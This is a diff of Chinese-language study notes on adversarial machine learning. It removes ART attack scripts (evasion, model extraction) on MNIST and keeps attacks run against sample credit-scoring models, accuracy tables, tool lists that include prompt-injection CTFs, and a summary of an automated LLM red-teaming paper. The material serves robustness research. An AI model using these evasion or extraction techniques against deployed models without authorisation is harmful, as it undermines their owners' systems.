-predictions = classifier.predict(x_test_adv)
-accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("對抗性測試樣本的準確率: {}%".format(accuracy * 100))
-
+<原始程式碼保留>
 ```
+
 ![image](https://hackmd.io/_uploads/HkN5aRZ4a.png)
-##### LightGBM
+
+#### LightGBM
 
 ```python
-# 這個腳本展示了一個使用 ART 與 LightGBM 的簡單示例。這個示例在 MNIST 數據集上訓練一個小型模型
-# 並使用快速梯度符號方法（Fast Gradient Sign Method）創建對抗性示例。這裡我們使用 ART 分類器來訓練
-# 模型，也可以向 ART 分類器提供一個預訓練的模型。
-# 腳本中選擇的參數是為了減少計算需求，並不是為了最佳準確度。
-
-import lightgbm as lgb
-import numpy as np
-
-from art.attacks.evasion import ZooAttack
-from art.estimators.classification import LightGBMClassifier
-from art.utils import load_mnist
-
-# 步驟 1：加載 MNIST 數據集
-
-(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()
-
-# 步驟 1a：平展數據集
-
-x_test = x_test[0:5]
-y_test = y_test[0:5]
-
-nb_samples_train = x_train.shape[0]
-nb_samples_test = x_test.shape[0]
-x_train = x_train.reshape((nb_samples_train, 28 * 28))
-x_test = x_test.reshape((nb_samples_test, 28 * 28))
-
-# 步驟 2：創建模型
-
-params = {"objective": "multiclass", "metric": "multi_logloss", "num_class": 10, "force_col_wise": True}
-train_set = lgb.Dataset(x_train, label=np.argmax(y_train, axis=1))
-test_set = lgb.Dataset(x_test, label=np.argmax(y_test, axis=1))
-model = lgb.train(params=params, train_set=train_set, num_boost_round=100, valid_sets=[test_set])
-
-# 步驟 3：創建 ART 分類器
-
-classifier = LightGBMClassifier(model=model, clip_values=(min_pixel_value, max_pixel_value))
-
-# 步驟 4：訓練 ART 分類器
-
-# 模型已在步驟 2 中訓練
-
-# 步驟 5：在良性測試樣本上評估 ART 分類器
-
-predictions = classifier.predict(x_test)
-accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("良性測試樣本的準確率: {}%".format(accuracy * 100))
-
-# 步驟 6：生成對抗性測試樣本
-attack = ZooAttack(
-    classifier=classifier,
-    confidence=0.5,
-    targeted=False,
-    learning_rate=1e-1,
-    max_iter=200,
-    binary_search_steps=100,
-    initial_const=1e-1,
-    abort_early=True,
-    use_resize=False,
-    use_importance=False,
-    nb_parallel=250,
-    batch_size=1,
-    variable_h=0.01,
-)
-x_test_adv = attack.generate(x=x_test)
-
-# 步驟 7：在對抗性測試樣本上評估 ART 分類器
-
-predictions = classifier.predict(x_test_adv)
-accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("對抗性測試樣本的準確率: {}%".format(accuracy * 100))
-
+<原始程式碼保留>
 ```
+
 ![image](https://hackmd.io/_uploads/rJ2_RA-V6.png)
 
-四個攻擊面向比較
-- Projected Gradient Descent（PGD），這是一種常用的逃避攻擊方法
+---
+
+## 四個攻擊面向比較
+
+> PGD（逃避）、Copycat CNN（提取）等：保留原程式與輸出截圖，並在表格中摘要。
+
 ```python
-
-import tensorflow.compat.v1 as tf
-import numpy as np
-
-tf.compat.v1.disable_eager_execution()  # 添加此行以防止 Tensorflow 執行錯誤
-
-from art.attacks.evasion import ProjectedGradientDescent
-from art.estimators.classification import TensorFlowClassifier
-from art.utils import load_mnist
-
-# 步驟 1：加載 MNIST 數據集
-
-(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()
-
-# 步驟 2：創建模型
-
-input_ph = tf.placeholder(tf.float32, shape=[None, 28, 28, 1])
-labels_ph = tf.placeholder(tf.int32, shape=[None, 10])
-
-x = tf.layers.conv2d(input_ph, filters=4, kernel_size=5, activation=tf.nn.relu)
-x = tf.layers.max_pooling2d(x, 2, 2)
-x = tf.layers.conv2d(x, filters=10, kernel_size=5, activation=tf.nn.relu)
-x = tf.layers.max_pooling2d(x, 2, 2)
-x = tf.layers.flatten(x)
-x = tf.layers.dense(x, 100, activation=tf.nn.relu)
-logits = tf.layers.dense(x, 10)
-
-loss = tf.reduce_mean(tf.losses.softmax_cross_entropy(logits=logits, onehot_labels=labels_ph))
-optimizer = tf.train.AdamOptimizer(learning_rate=0.01)
-train = optimizer.minimize(loss)
-sess = tf.Session()
-sess.run(tf.global_variables_initializer())
-
-# 步驟 3：創建 ART 分類器
-
-classifier = TensorFlowClassifier(
-    clip_values=(min_pixel_value, max_pixel_value),
-    input_ph=input_ph,
-    output=logits,
-    labels_ph=labels_ph,
-    train=train,
-    loss=loss,
-    learning=None,
-    sess=sess,
-    preprocessing_defences=[],
-)
-
-# 步驟 4：訓練 ART 分類器
-
-classifier.fit(x_train, y_train, batch_size=64, nb_epochs=3)
-
-# 步驟 5：在良性測試範例上評估 ART 分類器
-
-predictions = classifier.predict(x_test)
-accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("良性測試範例的準確率: {}%".format(accuracy * 100))
-
-# 步驟 6：生成對抗性測試範例
-attack = ProjectedGradientDescent(estimator=classifier, max_iter=10, eps=0.2)
-x_test_adv = attack.generate(x=x_test)
-
-# 步驟 7：在對抗性測試範例上評估 ART 分類器
-
-predictions = classifier.predict(x_test_adv)
-accuracy = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("對抗性測試範例的準確率: {}%".format(accuracy * 100))
-
+<原始程式碼保留>
 ```
+
 ![image](https://hackmd.io/_uploads/S1YwS84ST.png)
 
-- Copycat CNN ，這是一種提取攻擊方法
 ```python
-import numpy as np
-import tensorflow as tf
-from art.attacks.extraction import CopycatCNN
-from art.estimators.classification import TensorFlowClassifier
-from art.utils import load_mnist
-
-# 禁用 eager execution 以兼容 ART
-tf.compat.v1.disable_eager_execution()
-
-# 加載 MNIST 數據集
-(x_train, y_train), (x_test, y_test), min_pixel_value, max_pixel_value = load_mnist()
-
-# 創建 TensorFlow 模型
-input_ph = tf.compat.v1.placeholder(tf.float32, shape=[None, 28, 28, 1])
-labels_ph = tf.compat.v1.placeholder(tf.int32, shape=[None, 10])
-
-x = tf.compat.v1.layers.conv2d(input_ph, filters=4, kernel_size=5, activation=tf.nn.relu)
-x = tf.compat.v1.layers.max_pooling2d(x, 2, 2)
-x = tf.compat.v1.layers.conv2d(x, filters=10, kernel_size=5, activation=tf.nn.relu)
-x = tf.compat.v1.layers.max_pooling2d(x, 2, 2)
-x = tf.compat.v1.layers.flatten(x)
-x = tf.compat.v1.layers.dense(x, 100, activation=tf.nn.relu)
-logits = tf.compat.v1.layers.dense(x, 10)
-
-loss = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(logits=logits, labels=tf.stop_gradient(labels_ph)))
-optimizer = tf.compat.v1.train.AdamOptimizer(learning_rate=0.01)
-train = optimizer.minimize(loss)
-
-sess = tf.compat.v1.Session()
-sess.run(tf.compat.v1.global_variables_initializer())
-
-# 創建 ART 分類器
-classifier = TensorFlowClassifier(
-    clip_values=(min_pixel_value, max_pixel_value),
-    input_ph=input_ph,
-    output=logits,
-    labels_ph=labels_ph,
-    train=train,
-    loss=loss,
-    learning=None,
-    sess=sess
-)
-
-# 訓練模型
-classifier.fit(x_train, y_train, batch_size=64, nb_epochs=3)
-
-# 評估攻擊前模型的準確率
-predictions = classifier.predict(x_test)
-accuracy_before_attack = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("攻擊前模型的準確率: {}%".format(accuracy_before_attack * 100))
-
-# 使用 Copycat CNN 進行提取攻擊
-attack = CopycatCNN(classifier=classifier, batch_size_fit=128, batch_size_query=128)
-thieved_classifier = TensorFlowClassifier(
-    clip_values=(min_pixel_value, max_pixel_value),
-    input_ph=input_ph,
-    output=logits,
-    labels_ph=labels_ph,
-    train=train,
-    loss=loss,
-    learning=None,
-    sess=sess
-)
-x_test_adv = attack.extract(x=x_test, y=y_test, thieved_classifier=thieved_classifier)
-
-# 評估攻擊後模型的準確率
-predictions = thieved_classifier.predict(x_test)
-accuracy_after_attack = np.sum(np.argmax(predictions, axis=1) == np.argmax(y_test, axis=1)) / len(y_test)
-print("攻擊後模型的準確率: {}%".format(accuracy_after_attack * 100))
-
-```
-```python
-# FastGradientMethod
-# 導入警告模塊，並關閉所有警告
-import warnings
-warnings.filterwarnings('ignore')
-
-# 設定 TensorFlow 的環境變量，以減少日誌輸出
-import os
-os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
-
-# 導入 TensorFlow 和相關層
-import tensorflow as tf
-from tensorflow.keras.layers import Dense, Flatten, Conv2D
-from tensorflow.keras import Model
-
-# 導入其他必要的庫
-import numpy as np
-from matplotlib import pyplot as plt
-
-# 導入 ART (Adversarial Robustness Toolbox) 的分類器和多種對抗性攻擊方法
-from art.estimators.classification import TensorFlowV2Classifier
-from art.attacks.evasion import FastGradientMethod, CarliniLInfMethod
-from art.attacks.evasion import ProjectedGradientDescent
-from art.attacks.evasion import AutoProjectedGradientDescent
-from art.attacks.evasion import AutoConjugateGradient
-
-# 檢查 TensorFlow 的版本，確保是 2.x 版本
-if tf.__version__[0] != '2':
-    raise ImportError('This notebook requires TensorFlow v2.')
-
-# 加載 MNIST 數據集，並對數據進行預處理
-(x_train, y_train), (x_test, y_test) = tf.keras.datasets.mnist.load_data()
-x_train, x_test = x_train / 255.0, x_test / 255.0
-
-# 將數據轉換為 float32 類型
-x_train = x_train.astype(np.float32)
-x_test = x_test.astype(np.float32)
-
-# 選擇部分測試數據進行測試
-x_test = x_test[0:10]
-y_test = y_test[0:10]
-
-# 增加一個額外的維度
-x_train = x_train[..., tf.newaxis]
-x_test = x_test[..., tf.newaxis]
-
-# 定義損失函數和優化器
-loss_object = tf.keras.losses.SparseCategoricalCrossentropy()
-optimizer = tf.keras.optimizers.Adam()
-
-# 設置訓練和測試時的度量標準
-train_loss = tf.keras.metrics.Mean(name='train_loss')
-train_accuracy = tf.keras.metrics.SparseCategoricalAccuracy(name='train_accuracy')
-test_loss = tf.keras.metrics.Mean(name='test_loss')
-test_accuracy = tf.keras.metrics.SparseCategoricalAccuracy(name='test_accuracy')
-
-# 定義一個 Keras 模型
-class KerasModel(Model):
-    def __init__(self):
-        super(KerasModel, self).__init__()
-        self.conv1 = Conv2D(filters=3, kernel_size=3, activation='relu')
-        self.flatten = Flatten()
-        self.dense1 = Dense(10, activation='softmax')
-
-    def call(self, x):
-        x = self.conv1(x)
-        x = self.flatten(x)
-        x = self.dense1(x)
-        return x
-
-# 實例化模型和準備訓練測試數據
-model = KerasModel()
-train_ds = tf.data.Dataset.from_tensor_slices((x_train, y_train)).shuffle(10000).batch(32)
-test_ds = tf.data.Dataset.from_tensor_slices((x_test, y_test)).batch(32)
-
-# 定義訓練和測試步驟
-@tf.function
-def train_step(images, labels):
-    with tf.GradientTape() as tape:
-        predictions = model(images)
-        loss = loss_object(labels, predictions)
-    gradients = tape.gradient(loss, model.trainable_variables)
-    optimizer.apply_gradients(zip(gradients, model.trainable_variables))
-    train_loss(loss)
-    train_accuracy(labels, predictions)
-
-@tf.function
-def test_step(images, labels):
-    predictions = model(images)
-    t_loss = loss_object(labels, predictions)
-
-    test_loss(t_loss)
-    test_accuracy(labels, predictions)
-
-# 設定並執行訓練循環
-epochs = 3
-for epoch in range(epochs):
-    for images, labels in train_ds:
-        train_step(images, labels)
-
-    for test_images, test_labels in test_ds:
-        test_step(test_images, test_labels)
-
-    # 打印訓練和測試的損失以及準確率
-    template = 'Epoch {}, Loss: {:4.2f}, Accuracy: {:4.2f}, Test Loss: {:4.2f}, Test Accuracy: {:4.2f}'
-    print(template.format(epoch + 1,
-                          train_loss.result(),
-                          train_accuracy.result() * 100,
-                          test_loss.result(),
-                          test_accuracy.result() * 100))
-
-# 在測試數據上評估模型的準確率
-y_test_pred = np.argmax(model(x_test), axis=1)
-accuracy_test = np.sum(y_test_pred == y_test) / y_test.shape[0]
-print('Accuracy on test data: {:4.2f}%'.format(accuracy_test * 100))
-
-# 使用 ART 初始化 TensorFlow v2 分類器
-classifier = TensorFlowV2Classifier(model=model, nb_classes=10, input_shape=(28, 28, 1), loss_object=loss_object,
-                                    clip_values=(0, 1), channels_first=False)
-
-# 定義 FGSM 攻擊並生成對抗性範例
-attack_fgsm = FastGradientMethod(estimator=classifier)
-x_test_adv = attack_fgsm.generate(x_test)
-
-# 在對抗性測試數據上評估模型
-y_test_pred = np.argmax(model(x_test_adv), axis=1)
-accuracy_test_adv = np.sum(y_test_pred == y_test) / y_test.shape[0]
-perturbation = np.mean(np.abs((x_test_adv - x_test)))
-print('Accuracy on adversarial test data: {:4.2f}%'.format(accuracy_test_adv * 100))
-print('Average perturbation: {:4.2f}'.format(perturbation))
-
-```
-#### 1. 初始化和環境設置
-```python
-import warnings
-warnings.filterwarnings('ignore')
-import os
-os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
-import tensorflow as tf
-from tensorflow.keras.layers import Dense, Flatten, Conv2D
-from tensorflow.keras import Model
-import numpy as np
-from matplotlib import pyplot as plt
-import tensorflow.keras.losses
-import tensorflow.keras.optimizers
-import tensorflow.keras.metrics
-from art.estimators.classification import TensorFlowV2Classifier
-from art.attacks.evasion import AutoProjectedGradientDescent
-
-# 確保使用的是 TensorFlow 2
-if tf.__version__[0] != '2':
-    raise ImportError('This notebook requires TensorFlow v2.')
-```
-* 目的：導入所需的庫和模塊，設置環境以隱藏警告和日誌消息。
-* 主要動作：導入 TensorFlow、Keras 層、ART 分類器等，並檢查 TensorFlow 版本。
-
-
-#### 2. 加載和預處理數據
-```python
-# 載入 MNIST 數據集
-(x_train, y_train), (x_test, y_test) = tf.keras.datasets.mnist.load_data()
-x_train, x_test = x_train / 255.0, x_test / 255.0
-
-x_train = x_train.astype(np.float32)
-x_test = x_test.astype(np.float32)
-
-x_test = x_test[0:10]
-y_test = y_test[0:10]
-
-x_train = x_train[..., tf.newaxis]
-x_test = x_test[..., tf.newaxis]
+<原始程式碼保留>
 ```
 
-* 目的：加載 MNIST 手寫數字數據集，將數據標準化到 [0, 1] 範圍內，轉換數據類型，並準備一個測試子集。
-* 主要動作：標準化和格式調整。
-
-
-#### 3. 定義損失函數和優化器
-
 ```python
-loss_object = tf.keras.losses.SparseCategoricalCrossentropy(from_logits=True)
-optimizer = tf.keras.optimizers.Adam()
+# FastGradientMethod…（原始程式碼保留）
 ```
 
-* 目的：為訓練過程選擇合適的損失函數和優化器。
-* 主要動作：選擇稀疏分類交叉熵損失函數和 Adam 優化器。
+#### 分步說明（原文保留並加上小標）
 
+1. 初始化與環境設置
+2. 數據載入與預處理
+3. 損失函數與優化器
+4. 定義與構建模型
+5. 訓練模型
+6. 轉為 ART 分類器
+7. 生成對抗樣本
+8. 評估對抗影響
 
-#### 4. 定義和構建神經網絡模型
-```python
-class KerasModel(Model):
-    def __init__(self):
-        super(KerasModel, self).__init__()
-        self.conv1 = Conv2D(filters=3, kernel_size=3, activation='relu')
-        self.flatten = Flatten()
-        self.dense1 = Dense(10)  # 移除 softmax，直接輸出 logits
+---
 
-    def call(self, x):
-        x = self.conv1(x)
-        x = self.flatten(x)
-        return self.dense1(x)
-
-model = KerasModel()
-```
-* 目的：定義一個用於數字分類的卷積神經網絡。
-* 主要動作：構建具有卷積層、平坦層和全連接層的模型。
-
-
-#### 5. 訓練模型
-```python
-train_ds = tf.data.Dataset.from_tensor_slices((x_train, y_train)).shuffle(10000).batch(32)
-test_ds = tf.data.Dataset.from_tensor_slices((x_test, y_test)).batch(32)
-
-@tf.function
-def train_step(images, labels):
-    with tf.GradientTape() as tape:
-        predictions = model(images)
-        loss = loss_object(labels, predictions)
-    gradients = tape.gradient(loss, model.trainable_variables)
-    optimizer.apply_gradients(zip(gradients, model.trainable_variables))
-
-epochs = 3
-for epoch in range(epochs):
-    for images, labels in train_ds:
-        train_step(images, labels)
-```
-* 目的：使用批量訓練的方式來訓練神經網絡。
-* 主要動作：對每個批量的數據計算損失，然後更新網絡的權重。
-
-
-#### 6. 將 Keras 模型轉換為 ART 分類器
-
-```python
-classifier = TensorFlowV2Classifier(
-    model=model,
-    loss_object=loss_object,
-    train_step=train_step,
-    nb_classes=10,
-    input_shape=(28, 28, 1),
-    clip_values=(0, 1)
-)
-```
-* 目的：將 Keras 模型轉換為 ART 可用的格式，以進行對抗性攻擊。
-* 主要動作：包裝原生 TensorFlow 模型以適配 ART。
-
-
-#### 7. 使用 ART 分類器進行攻擊
-
-```python
-attack = AutoProjectedGradientDescent(estimator=classifier)
-x_test_adv = attack.generate(x=x_test)
-```
-* 目的：使用自動投影梯度下降（AutoProjectedGradientDescent）攻擊來生成對抗性樣本。
-* 主要動作：選擇攻擊方法並生成對抗性樣本。
-
-
-#### 8. 評估對抗性樣本對模型的影響
-```python
-y_test_pred = np.argmax(tf.nn.softmax(model(x_test_adv)), axis=1)
-accuracy_test_adv = np.sum(y_test_pred == y_test) / y_test.shape[0]
-perturbation = np.mean(np.abs((x_test_adv - x_test)))
-print('Accuracy on adversarial test data: {:4.2f}%'.format(accuracy_test_adv * 100))
-print('Average perturbation: {:4.2f}'.format(perturbation))
-```
-### 新加坡模型credit_scoring test
+## 新加坡模型credit\_scoring test
 [這項工作是新加坡金融管理局委託 Veritas 計畫的一部分進行的，目標是加速在金融服務業採用負責任的人工智慧和數據分析 (AIDA)。](https://github.com/veritas-project/phase1/blob/main/credit_scoring/README.md)
 其中模型是以Scikit-learn框架的羅吉斯回歸
 ```bash
@@ -1361,9 +519,11 @@ $pip install jupyterlab==2.2.6
 $pip install pytest==6.1.1
 $pip install flake8==3.8.4
 ```
+
 ![image](https://hackmd.io/_uploads/rJKVNoSF6.png)
 
-#### 1.導入庫和設置
+#### 1. 導入庫和設置
+
 ```python
 
 # 導入所需的庫
@@ -1387,7 +547,7 @@ import utils.credit as utils
 
 ```
 
-#### 2.數據加載和預處理
+#### 2. 數據加載和預處理
 
 ```python
 # 定義要刪除的列
@@ -1403,10 +563,10 @@ print(f"Train set length: {len(y_train)}, default rate: {round(1 - np.mean(y_tra
 print(f"Test set length: {len(y_test)}, default rate: {round(1 - np.mean(y_test), 4)}")
 print(X_train.columns)
 ```
+
 ![image](https://hackmd.io/_uploads/S1V9NiSYp.png)
 
 #### 3. 邏輯回歸模型
-
 ```python
 # 定義模型參數
 best_regularizer = 1e-1
@@ -1416,10 +576,10 @@ best_th = 0.43
 model = utils.train_log_reg_model(X_train, y_train, seed=0, C=best_regularizer, upsample=True, verbose=True)
 ```
 
-
 ![image](https://hackmd.io/_uploads/B184vjSK6.png)
 
 #### 4. 模型訓練和評估
+
 ```python
 # 計算測試集上的性能
 def prob_of_good(model, X):
@@ -1443,12 +603,15 @@ def plot_roc(model, X, y):
 plot_roc(model, X_test, y_test)
 
 ```
+
 ![image](https://hackmd.io/_uploads/B1eXujSYa.png)
 ![image](https://hackmd.io/_uploads/rJvHdjHFT.png)
 ![image](https://hackmd.io/_uploads/SyoLdiHKa.png)
 
 #### 4. 使用 ART 進行對抗性攻擊
-##### BoundaryAttack
+
+**BoundaryAttack**
+
 ```python
 from art.estimators.classification import SklearnClassifier
 from art.attacks.evasion import BoundaryAttack
@@ -1486,63 +649,37 @@ accuracy = np.sum(predictions == y_test_sample) / len(y_test_sample)
 print("對抗樣本的準確率: {:.2f}%".format(accuracy * 100))
 
 ```
+
 ![image](https://hackmd.io/_uploads/Hyv1UrUKp.png)
-#### ZooAttack
+
+**ZooAttack**
 ![image](https://hackmd.io/_uploads/HJGm8rIY6.png)
 
 bound 100
 
-### 新加坡模型customer_marketing test
-#### debug過程
+---
+
+## 新加坡模型customer\_marketing test
+
+#### debug 過程
 
 [colab](https://drive.google.com/file/d/1mg-XulewlApye1N4tuapajBLDGOpwcu5/view?usp=sharing)
 
+🛠️ **錯誤診斷與解決方法**
 
+1. **AttributeError**
+   ![image](https://hackmd.io/_uploads/H1woic49p.png)
+   Pipeline 缺少 `select`：加入 `PipelineWrapper`。
+2. **TypeError**
+   ![image](https://hackmd.io/_uploads/rkVCmC4q6.png)
+   目標標籤類型不相容，使用 `LabelEncoder` 並處理 `np.isnan` 相關型別。
+3. **ImportError**
+   ![image](https://hackmd.io/_uploads/S1X6wDPq6.png)
+   `ScikitlearnDecisionTreeClassifier` 不存在：暫無解。
 
+##### code（階段性）
 
-
-🛠️ 錯誤診斷與解決方法
-1. AttributeError
-
-    ![image](https://hackmd.io/_uploads/H1woic49p.png)
-問題描述：test_model 函數因為 scikit-learn 的 Pipeline 對象缺少 select 方法而報錯。
-解決方案：建議使用一個包裝類 PipelineWrapper 為 Pipeline 添加缺失的 select 方法。
-2. TypeError
-
-    ![image](https://hackmd.io/_uploads/rkVCmC4q6.png)
-問題描述：處理目標標籤時，因數據類型不兼容，導致 np.isnan 函數報錯。
-解決方案：確保數據類型兼容，尤其是在使用 LabelEncoder 時。
-
-3. ImportError
-![image](https://hackmd.io/_uploads/S1X6wDPq6.png)
-問題描述：引用ScikitlearnDecisionTreeClassifier分類器時，沒有這東西。
-解決方案：暫時無法解決。
-
-
-##### code(階段性)
-
-###### 變數說明
-yrej_ts：
-
-這是測試集的標籤或目標變數。在監督學習中，yrej_ts 通常用於評估模型的預測性能，即將模型的預測結果與 yrej_ts 進行比較以計算準確率或其他性能指標。
-Xts：
-
-這是測試集的特徵數據。在機器學習中，Xts 包含了用於模型預測的輸入數據。通常在模型訓練完成後，使用 Xts 來評估模型在未知數據上的表現。
-y_pred：
-
-這是模型對測試集 Xts 的預測結果。y_pred 通常用於與 yrej_ts 進行比較，以評估模型的準確性和其他相關的性能指標。
-x_test_adv：
-
-這是經過對抗性攻擊後生成的對抗性樣本。這些樣本用於測試模型在面對經過特別製造的攻擊（例如干擾輸入數據）時的韌性。
-y_targets：
-
-這是用於定向對抗性攻擊的目標標籤。在定向攻擊中，y_targets 代表攻擊者希望模型將輸入數據錯誤分類為的類別。
-x_test_subset：
-
-這是從原始測試集 Xts 中選取的一個子集，用於進行對抗性攻擊。在您的代碼中，它是從 Xts 中選取的前 100 個樣本。
-y_target_subset：
-
-這是與 x_test_subset 相對應的目標標籤子集，用於定向對抗性攻擊。它是從 y_targets 中選取的與 x_test_subset 相對應的部分。
+**變數說明**：yrej\_ts（測試標籤）、Xts（測試特徵）、y\_pred（預測）、x\_test\_adv（對抗樣本）、y\_targets（定向攻擊目標）、x\_test\_subset / y\_target\_subset（子集）。
 
 ```python!
 from sklearn.preprocessing import LabelEncoder
@@ -1584,36 +721,33 @@ accuracy_adv = np.mean(predictions_adv == yrej_ts[:100])
 print("對抗樣本的準確率: {:.2f}%".format(accuracy_adv * 100))
 
 ```
+
 ##### 準確率比較
+
 * 未攻擊前
-![image](https://hackmd.io/_uploads/B1XWuAV9a.png)
+  ![image](https://hackmd.io/_uploads/B1XWuAV9a.png)
 
 * boundary
-![image](https://hackmd.io/_uploads/Hk2rO0VqT.png)
+  ![image](https://hackmd.io/_uploads/Hk2rO0VqT.png)
 
 * zooattack
-![image](https://hackmd.io/_uploads/BJ_Nh0V9a.png)
+  ![image](https://hackmd.io/_uploads/BJ_Nh0V9a.png)
 
-DeepFool 攻擊需要能夠計算類別梯度（class gradients），而標準的 Scikit-learn 分類器不支持這種操作。
-
-FGSM 因為 FGSM 需要計算損失梯度，而標準的 Scikit-learn 分類器不提供這種功能。
-
+DeepFool 與 FGSM：因 Sklearn 分類器缺 class gradients / 損失梯度而受限。
 ZooAttack 80
 
-
-
-
 * 目的：測量對抗性樣本對模型準確性的影響。
-* 主要動作：計算對抗性樣本的預測準確率和平均擾動程度。
+* 主要動作：計算攻擊前後準確率與平均擾動。
 
 ![image](https://hackmd.io/_uploads/HJFfuDVHa.png)
 
-| 攻擊類型 | 使用的攻擊方法 | 未攻擊前準確率 (%) | 攻擊後準確率 (%) | 備註 |
-|----------|----------------|-------------------|-----------------|------|
-| 逃避     | Projected Gradient Descent | 98.1 | 1.98 | 顯著降低準確率 |
-| 提取     | Copycat CNN | 97.87 | 81.94 | 略微降低準確率 |
-| 投毒     | Backdoor Attack | - | - | 準確率可能不變或提高，取決於攻擊目標與原始標籤的一致性、數據集增強效果、過擬合，以及評估方法 |
-| 推論     | Membership Inference (或其他) | - | - | 通常不影響模型的準確率，因為推論攻擊的目標是揭露訓練數據的隱私信息，而不是直接影響模型的預測性能 |
+| 攻擊類型 | 使用的攻擊方法                    | 未攻擊前準確率 (%) | 攻擊後準確率 (%) | 備註                 |
+| ---- | -------------------------- | ----------: | ---------: | ------------------ |
+| 逃避   | Projected Gradient Descent |        98.1 |       1.98 | 顯著降低準確率            |
+| 提取   | Copycat CNN                |       97.87 |      81.94 | 略為降低               |
+| 投毒   | Backdoor Attack            |           - |          - | 視標籤一致性/增強/過擬合/評估方式 |
+| 推論   | Membership Inference 等     |           - |          - | 主要聚焦隱私而非準確率        |
+
 
 | 使用的攻擊方法                    | 未攻擊前準確率 (%) | 攻擊後準確率 (%) | 平均擾動幅度 | 攻擊內容 |
 |-----------------------------------|-------------------|-----------------|------------|---------|
@@ -1650,9 +784,9 @@ FGSM                              | 93.69             | 0               | 0.16  
 |FeatureAdversariesNumpy|93.69|x|x|
 |Boundary Attack|93.69|50|x|許多機器學習演算法容易受到其輸入幾乎難以察覺的擾動的影響。到目前為止，尚不清楚對抗性擾動對真實世界機器學習應用程式的安全性有多大風險，因為用於生成此類擾動的大多數方法要麼依賴於詳細的模型資訊（基於梯度的攻擊），要麼依賴於置信度分數，例如類概率（基於分數的攻擊），這兩種方法在大多數現實世界的場景中都不可用。在許多情況下，人們目前需要退回到基於轉移的攻擊，這些攻擊依賴於繁瑣的替代模型，需要訪問訓練數據並且可以防禦。在這裡，我們強調攻擊的重要性，這些攻擊完全依賴於最的模型決策。這種基於決策的攻擊（1）適用於現實世界的黑匣子模型，如自動駕駛汽車，（2）比基於轉移的攻擊需要更少的知識，更容易應用，（3）比基於梯度或分數的攻擊更適用於簡單的防禦。以前此類攻擊僅限於簡單模型或簡單數據集。在這裡，我們介紹邊界攻擊，這是一種基於決策的攻擊，它從大型對抗性擾動開始，然後尋求在保持對抗性的同時減少擾動。該攻擊在概念上很簡單，幾乎不需要超參數調整，不依賴於替代模型，並且與標準計算機視覺任務（如 ImageNet）中最好的基於梯度的攻擊具有競爭力。我們從這個 HTTP URL 對兩個黑盒演算法進行攻擊。特別是邊界攻擊和一般的基於決策的攻擊類別，為研究機器學習模型的魯棒性開闢了新的途徑，並提出了有關已部署機器學習系統安全性的新問題。該攻擊的實現可作為 Foolbox 的一部分，位於此 https URL 。
 
+---
 
-
-
+## 更多工具清單與參考
 
 
 每個攻擊手法都有不同參數使用方Dpatch [doc](https://adversarial-robustness-toolbox.readthedocs.io/en/latest/modules/attacks/evasion.html)
@@ -1792,12 +926,15 @@ ML Model Serialization Attacks.**模型序列化攻擊是指模型保存時，�
     >**[MLsploit](https://mlsploit.github.io/) 是第一個使用者友好、基於雲的系統，使研究人員和從業者能夠快速評估和比較機器學習 （ML） 模型的最先進的對抗性攻擊和防禦。**
 - [TensorFlow Privacy](https://github.com/tensorflow/privacy) - 隱私保護機器學習演算法和工具庫。
 - [Foolbox](https://github.com/bethgelab/foolbox) - 用於建立和評估對抗性攻擊和防禦的 Python 工具箱。.
-#### 安裝建置
+
+#### 安裝建置（Foolbox）
+
 ```
 !pip install foolbox
 ```
-    
+
 #### demo
+
 ```python
 #!/usr/bin/env python3
 import torchvision.models as models
@@ -1897,6 +1034,8 @@ if __name__ == "__main__":
 - [Damn Vulnerable LLM Project](https://github.com/harishsg993010/DamnVulnerableLLMProject) - A Large Language Model designed for getting hacked
 - [Gandalf Lakera](https://gandalf.lakera.ai/) - Prompt Injection CTF playground
 
+---
+
 ## Red Team
 ### 摘要　
 （Abstract）部分提到，語言模型（Language Models, LMs）常常因為有潛在的傷害性而無法被部署。傳統的方法是在部署前，使用人工標註來識別有害行為。然而，這樣的方法成本高昂，並限制了測試用例的數量和多樣性。本研究自動找出目標語言模型在哪些情況下會表現出有害行為，並使用另一個語言模型來生成測試用例（即“紅隊測試”）。研究還探討了多種生成測試用例的方法，從零標註生成到強化學習。
@@ -1960,4 +1099,3 @@ DPG的特定失敗模式：
 
 基於上述的失敗模式，文中建議DPG的訓練數據或提示應該補充更多的例子。這些例子應該包括一位發言人拒絕另一位發言人的前提，或拒絕回答某些問題，以避免產生不恰當的回覆。
 總之，這部分的目的是通過分群方法來深入理解DPG在某些情境下可能產生冒犯性回覆的原因，並提供了一些建議來改善這些問題。
-
